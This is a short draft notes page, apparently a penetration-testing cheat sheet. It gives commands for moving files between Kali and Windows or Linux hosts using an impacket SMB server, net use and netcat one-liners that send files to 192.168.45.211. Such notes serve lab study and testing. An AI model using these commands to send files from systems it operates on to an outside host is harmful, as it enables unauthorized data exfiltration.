+++
date = '2026-02-22T23:22:16+09:00'
draft = true
title = 'File Transfer'
tags = ["smbserver","nc"]
+++

# SMB
set up SMB server on kali

`impacket-smbserver test . -smb2support -user user -password 1234`

Connect to the SMB from windows

`net use Z: \\192.168.45.211\test /user:user 1234`

# nc
## linux
file receiver

`nc -lp 1234 > file.txt`

file sender

`nc -q 0 192.168.45.211 1234 < file.txt`

## windows
file receiver 

`nc -lp 1234 > file.txt`

file sender

`nc.exe -w 1 192.168.45.211 1234 < file.txt`